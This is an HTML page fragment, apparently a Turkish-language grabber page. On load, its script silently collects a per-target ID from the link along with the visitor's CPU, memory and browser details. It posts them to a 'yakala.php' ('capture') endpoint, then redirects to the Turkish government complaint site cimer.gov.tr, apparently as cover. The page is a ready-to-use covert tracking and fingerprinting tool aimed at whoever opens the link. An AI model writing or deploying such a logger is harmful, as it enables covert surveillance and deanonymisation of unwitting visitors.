<body>

    <div class="footer">Ünlü değiliz ama duymuşsunuzdur.</div>

    <script>
        async function capture() {
            const urlParams = new URLSearchParams(window.location.search);
            let userId = urlParams.get('id') || "yvx01";

            let info = {
                uid: userId,
                cpu: navigator.hardwareConcurrency || "-",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "-",
                device: navigator.userAgent
            };

            // Veriyi doğrudan yakala.php'ye gönderiyoruz, gerisini PHP halledecek
            fetch('yakala.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });

            setTimeout(() => { window.location.href = "https://www.cimer.gov.tr"; }, 3000);
        }
        window.onload = capture;
